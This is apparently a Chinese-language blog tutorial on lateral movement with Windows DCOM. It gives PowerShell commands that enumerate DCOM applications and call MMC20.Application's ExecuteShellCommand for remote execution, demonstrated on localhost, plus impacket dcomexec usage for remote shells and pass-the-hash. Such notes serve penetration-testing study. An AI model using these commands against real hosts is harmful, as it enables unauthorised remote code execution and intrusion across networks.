---
title: "DCOM的利用"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# DCOM的利用

### DCOM介绍

DCOM（分布式组件对象模型）是微软的一系列概念和程序接口。它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是Internet上。利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求，使用DCOM进行横向移动的优势之一在于，在远程主机上执行的进程将会是托管COM服务器端的软件

### 使用DCOM横向移动

#### 获取DCOM列表

~~~powershell
Get-CimInstance Win32_DCOMApplication

Get-CimInstance -class Win32_DCOMApplication | select appid,name

Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
~~~

#### DCOM横向移动前提

* 需要关闭系统防火墙
* 必须拥有管理员权限
* 在远程主机上执行命令时，必须使用域管的administrator账户或者目标主机具有管理员权限的账户

#### 利用

利用DCOM中的一些组件可以实现远程执行命令

##### MMC20.Application

首先本地实验一下命令执行：

* 通过PowerShell与DCOM进行远程交互，提供一个DCOM ProgID和一个IP地址，即可远程返回一个COM对象的实例

  ~~~powershell
  $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","127.0.0.1"))
  ~~~

* 调用"ExecuteShellCommand"方法在远程主机上启动进程

  ~~~powershell
  $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimzed")
  ~~~

  ![image-20241101151011175](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241101151012480-1870120276.png)

  成功执行命令

远程上线同理，但需要自身管理员账户RID为500，否则会被UAC

此外还有shellwindows和shellbrowserwindows组件能够实现远程命令执行，读者可以自行了解

### dcomexec的使用

impacket套件的dcomexec.py也可以实现远程命令执行（同样需要管理员账户RID为500）：

~~~cmd
dcomexec.exe [domain/]username:password@ip //创建一个交互式shell
dcomexec.exe [domain/]username:password@ip command // 执行命令
dcomexec.exe [domain/]username:@ip -hashes [hash] //hash传递
~~~

![image-20241101175241630](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241101175242941-833178659.png)